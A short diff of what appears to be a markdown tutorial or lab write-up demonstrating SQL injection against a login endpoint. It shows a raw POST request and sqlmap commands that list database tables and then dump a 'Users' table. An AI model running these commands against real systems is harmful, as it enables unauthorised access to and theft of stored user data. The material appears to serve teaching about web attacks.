@@ -54,6 +54,7 @@ User-Agent: curl/7.54.0
 Accept: */*
 Content-Type: application/json
 Content-Length: 31
+
 {"user":"user", "pass":"password"}
 ```
 
@@ -65,10 +66,16 @@ $ sqlmap -r postRequest.txt
 
 <img src="attack-3.png" align="center"/>
 
-After understanding how this database is structured, an attacker could use the following command to retrieve sensitive information from the it:
+After understanding how this database is structured, an attacker could use the following command to retrieve database details:
 
 ```sh
-$ sqlmap -r postRequest.txt -D webpage -T users --dump
+$ sqlmap -r postRequest.txt --tables
+```
+
+And then retrieve sensitive information from the it:
+
+```sh
+$ sqlmap -r postRequest.txt -D a1db -T Users --dump
 ```
 
 <img src="attack-4.png" align="center"/>
